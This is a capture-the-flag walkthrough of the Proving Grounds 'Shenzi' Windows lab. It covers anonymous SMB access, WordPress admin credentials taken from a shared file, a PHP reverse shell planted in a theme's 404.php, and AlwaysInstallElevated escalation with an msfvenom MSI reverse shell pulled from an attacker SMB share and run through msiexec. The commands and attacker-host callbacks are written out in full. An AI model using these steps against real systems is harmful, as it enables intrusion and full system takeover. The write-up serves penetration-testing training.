# Shenzi - Proving Grounds Practice

> **Kill Chain Summary**:
> Anonymous SMB Enumeration -> WordPress Admin Credentials Disclosed in `passwords.txt` -> Virtual Host Discovery (`/shenzi/`) -> Theme Editor `404.php` Code Injection -> Reverse Shell as `shenzi` -> Registry Enumeration (AlwaysInstallElevated Enabled) -> Malicious MSI Execution via `msiexec` -> System Shell (`NT AUTHORITY\SYSTEM`).

| Property | Value |
| :--- | :--- |
| **Target Name** | Shenzi |
| **Platform** | Proving Grounds Practice |
| **OS** | Windows |
| **Difficulty** | Intermediate |
| **Status** | Rooted |
| **Key Techniques** | SMB Anonymous Enumeration, Credential Disclosure, WordPress 404 Theme Shell, AlwaysInstallElevated MSI Privilege Escalation |

---

## 1. Reconnaissance and Enumeration

### 1.1 Port Scanning

A full TCP port scan was conducted using Nmap to identify all exposed network services:

```bash
sudo nmap -p- --min-rate 1000 -T4 -Pn 192.168.186.55 -oA nmap/allports
```

```text
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
5040/tcp  open  unknown
7680/tcp  open  pando-pub
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
```

### 1.2 Service Enumeration

#### FTP (Port 21)
Anonymous login was attempted on the FileZilla FTP server:

```bash
ftp 192.168.186.55
```

```text
Connected to 192.168.186.55.
220-FileZilla Server version 0.9.41 beta
220-written by Tim Kosse (Tim.Kosse@gmx.de)
220 Please visit http://sourceforge.net/projects/filezilla/
Name (192.168.186.55:vagrant): anonymous
331 Password required for anonymous
Password: 
530 Login or password incorrect!
ftp: Login failed
```

Anonymous FTP access is disabled.

#### HTTP and HTTPS (Ports 80 and 443)
Browsing to `http://192.168.186.55/` displays the default XAMPP landing page:

![[Pasted image 20260830113202.png]]

A directory fuzzing scan with Gobuster returned standard XAMPP paths, most of which returned `403 Forbidden`:

```bash
gobuster dir -u http://192.168.186.55 -w /usr/share/wordlists/dirb/common.txt
```

```text
.hta                 (Status: 403) [Size: 1046]
.htpasswd            (Status: 403) [Size: 1046]
.htaccess            (Status: 403) [Size: 1046]
cgi-bin/             (Status: 403) [Size: 1060]
dashboard            (Status: 301) [Size: 344] [--> http://192.168.186.55/dashboard/]
favicon.ico          (Status: 200) [Size: 30894]
img                  (Status: 301) [Size: 338] [--> http://192.168.186.55/img/]
index.php            (Status: 302) [Size: 0] [--> http://192.168.186.55/dashboard/]
licenses             (Status: 403) [Size: 1205]
phpmyadmin           (Status: 403) [Size: 1205]
server-info          (Status: 403) [Size: 1205]
server-status        (Status: 403) [Size: 1205]
webalizer            (Status: 403) [Size: 1046]
```

#### SMB (Port 445)
Enumerating SMB shares with null session / anonymous access revealed an accessible non-standard share named `Shenzi`:

```bash
smbclient -L //192.168.186.55/ -N
```

```text
        Sharename       Type      Comment
        ---------       ----      -------
        IPC$            IPC       Remote IPC
        Shenzi          Disk      
```

Connecting to the `Shenzi` share without credentials:

```bash
smbclient //192.168.186.55/Shenzi -N
```

```text
smb: \> ls
  .                                   D        0
  ..                                  D        0
  passwords.txt                       A      894
  readme_en.txt                       A     7367
  sess_klk75u2q4rpgfjs3785h6hpipp      A     3879
  why.tmp                             A      213
  xampp-control.ini                   A      178

smb: \> mget *
```

Downloading and inspecting `passwords.txt`:

```bash
cat passwords.txt
```

```text
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)

2) FileZilla FTP:

   [ You have to create a new user on the FileZilla Interface ] 

3) Mercury (not in the USB & lite version): 

   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin 
(admin@localhost)

   User: newuser  
   Password: wampp 

4) WEBDAV: 

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
   For activation please comment out the httpd-dav.conf and
   following modules in the httpd.conf
   
   LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so  
   
   Please do not forget to refresh the WEBDAV authentification (users and passwords).     

5) WordPress:

   User: admin
   Password: FeltHeadwallWight357
```

The credential file provides credentials for a WordPress installation:
- **Username:** `admin`
- **Password:** `FeltHeadwallWight357`

WebDAV options were tested and verified inactive:

```bash
curl -s -I -X OPTIONS http://192.168.186.55/ | grep -i "dav\|allow"
```

#### Locating the WordPress Installation
Standard directory fuzzing on the root domain did not directly reveal the WordPress instance. However, reviewing `phpinfo.php` and the NetBIOS hostname revealed the target name `shenzi`. Navigating to `/shenzi/` exposed the WordPress application:

![[Pasted image 20260830114209.png]]

Accessing the administration login at `http://192.168.186.55/shenzi/wp-admin`:

![[Pasted image 20260830114615.png]]

Authenticating with `admin` : `FeltHeadwallWight357` granted administrator access to the WordPress dashboard.

---

## 2. Initial Access

With administrator privileges on WordPress, remote code execution can be achieved by editing theme PHP templates.

1. Navigate to **Appearance > Theme Editor**.
2. Select the active theme and locate `404.php`.
3. Replace the contents of `404.php` with a PHP reverse shell (e.g., Ivan Sincek's PHP reverse shell configured with your Kali IP and port 80).
4. Save the file modifications.
5. Start a Netcat listener on port 80:

```bash
sudo nc -lvnp 80
```

6. Trigger the reverse shell by sending a request to a non-existent URL within the theme directory:

```bash
curl http://192.168.186.55/shenzi/wp-content/themes/twentytwenty/404.php
```

A reverse shell is received as user `shenzi`:

```text
listening on [any] 80 ...
connect to [192.168.45.225] from (UNKNOWN) [192.168.186.55] 53164
SOCKET: Shell has connected! PID: 6940
Microsoft Windows [Version 10.0.19042.1526]
(c) Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\shenzi> whoami
shenzi\shenzi
```

Reading the low-privileged flag:

```cmd
type C:\Users\shenzi\Desktop\local.txt
```

```text
[FLAG REDACTED]
```

---

## 3. Privilege Escalation

### 3.1 Local Enumeration

Checking registry settings related to Windows Installer elevated policies:

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```text
HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

> [!NOTE] Concept: AlwaysInstallElevated Privilege Escalation
> When both `HKCU` and `HKLM` have the `AlwaysInstallElevated` registry key set to `1` (`0x1`), Windows Installer executes all `.msi` packages with elevated privileges (`NT AUTHORITY\SYSTEM`), even when initiated by an unprivileged user.

### 3.2 Exploitation via Malicious MSI

Generate a reverse shell packaged as an MSI file using `msfvenom`:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.225 LPORT=4444 -f msi > shell.msi
```

Host the payload using an Impacket SMB share:

```bash
impacket-smbserver share $(pwd) -smb2support
```

Copy the MSI file onto the target machine or execute it directly from the share:

```cmd
copy \\192.168.45.225\share\shell.msi C:\Users\shenzi\shell.msi
```

Set up a Netcat listener on port 4444:

```bash
nc -lvnp 4444
```

Execute the installer silently with `msiexec`:

```cmd
msiexec /quiet /qn /i C:\Users\shenzi\shell.msi
```

The installer runs with elevated system rights and connects back to the listener:

```text
listening on [any] 4444 ...
connect to [192.168.45.225] from (UNKNOWN) [192.168.186.55] 53258
Microsoft Windows [Version 10.0.19042.1526]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32> whoami
nt authority\system
```

Retrieve the root flag:

```cmd
type C:\Users\Administrator\Desktop\proof.txt
```

```text
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# SMB Anonymous Share Listing and Access
smbclient -L //192.168.186.55/ -N
smbclient //192.168.186.55/Shenzi -N

# Query AlwaysInstallElevated Registry Keys
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Generate Malicious MSI Reverse Shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f msi -o shell.msi

# Execute MSI Silently as SYSTEM
msiexec /quiet /qn /i C:\Users\shenzi\shell.msi
```

---

## 5. Key Takeaways and Lessons Learned

1. **Context-Aware Web Enumeration:** Standard directory wordlists can fail to discover custom application directories named after hostnames or machine names. Correlating hostnames extracted from SMB, NetBIOS, or `phpinfo.php` is an effective enumeration strategy.
2. **SMB Share Scrutiny:** Anonymous SMB access must always be audited thoroughly. Backup files and configuration templates (`passwords.txt`) often contain live administrative credentials.
3. **AlwaysInstallElevated Misconfigurations:** Always verify both registry keys (`HKCU` and `HKLM`). If both return `0x1`, unprivileged users can immediately gain `SYSTEM` privileges by running an MSI payload with `msiexec /quiet /qn /i <payload.msi>`.

---

#proving-grounds #windows #intermediate #smb #wordpress #theme-editor #alwaysinstallelevated #msi #privesc
